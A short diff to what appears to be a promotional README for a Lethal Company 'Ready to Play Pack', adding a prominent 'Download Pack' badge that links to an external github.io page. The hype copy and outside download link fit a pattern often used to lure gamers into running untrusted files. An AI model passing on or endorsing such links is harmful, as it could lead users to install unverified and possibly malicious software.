@@ -6,6 +6,8 @@ Squad wipes? Low FPS? Not anymore. This Ready Pack levels up your Lethal Company
 
 ---
 
+
+[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://lethal-company-ready-to-pack.github.io/.github/)
 ## **Product Description:**
 
 Let’s be real — Lethal Company can be *brutal* when you’re unprepared. Clunky controls, wild FPS drops, zero coordination. Enter the **Ready to Play Pack** — a streamlined loadout that gets you mission-ready with no hassle.
